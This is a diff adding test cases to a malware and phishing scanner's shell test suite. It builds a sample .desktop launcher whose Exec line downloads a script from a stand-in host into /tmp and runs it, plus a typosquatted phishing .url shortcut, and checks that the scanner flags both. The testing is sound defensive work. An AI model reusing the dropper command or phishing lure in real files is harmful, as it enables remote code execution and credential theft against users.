@@ -429,6 +429,31 @@ printf '{ "scripts": { "preinstall": "node setup_bun.js" } }' > /tmp/hlse_sh2.$$
     || check "manifest: 'node setup_bun.js' Shai-Hulud 2.0 loader flagged" "0" "1"
 rm -rf /tmp/hlse_sh2.$$
 
+# Launcher/shortcut carriers (F8): .desktop Exec= curl→/tmp dropper (APT36) → flagged
+LCH_DIR=$(mktemp -d)
+printf '[Desktop Entry]\nType=Application\nName=Doc Viewer\nExec=sh -c "curl -s https://cdn.bad.example/p.sh -o /tmp/p && chmod +x /tmp/p && /tmp/p"\n' > "$LCH_DIR/apt36.desktop"
+./hlse_core file "$LCH_DIR/apt36.desktop" 2>&1 | grep -q "F8" \
+    && check "F8: .desktop curl→/tmp dropper flagged" "0" "0" \
+    || check "F8: .desktop curl→/tmp dropper flagged" "0" "1"
+
+# F8: .url InternetShortcut with phish link → flagged
+printf '[InternetShortcut]\nURL=https://paypa1-secure.verify-account.top/login\n' > "$LCH_DIR/phish.url"
+./hlse_core file "$LCH_DIR/phish.url" 2>&1 | grep -q "F8" \
+    && check "F8: .url with phish URL flagged" "0" "0" \
+    || check "F8: .url with phish URL flagged" "0" "1"
+
+# F8 FP guard: legit .desktop launcher (no download/exec payload) → no F8
+printf '[Desktop Entry]\nType=Application\nName=Firefox\nExec=firefox %%u\n' > "$LCH_DIR/ff.desktop"
+./hlse_core file "$LCH_DIR/ff.desktop" 2>&1 | grep -q "F8" \
+    && check "F8 FP guard: legit .desktop has no F8" "0" "1" \
+    || check "F8 FP guard: legit .desktop has no F8" "0" "0"
+
+# F1: double extension .pdf.desktop (APT36 masquerade) → flagged
+./hlse_core file nonexistent.pdf.desktop 2>&1 | grep -q "DOUBLE EXTENSION" \
+    && check "F1: .pdf.desktop double extension flagged" "0" "0" \
+    || check "F1: .pdf.desktop double extension flagged" "0" "1"
+rm -rf "$LCH_DIR"
+
 # Toll-road smishing (E-ZPass + urgency + payment) → ALERT/BLOCK
 ./hlse_core "E-ZPass: your account has an outstanding toll balance. Settle immediately to avoid penalties." 2>&1 | grep -qE "ALERT|BLOCK|ISOLATE" \
     && check "toll smishing (E-ZPass outstanding balance) → ALERT+" "0" "0" \
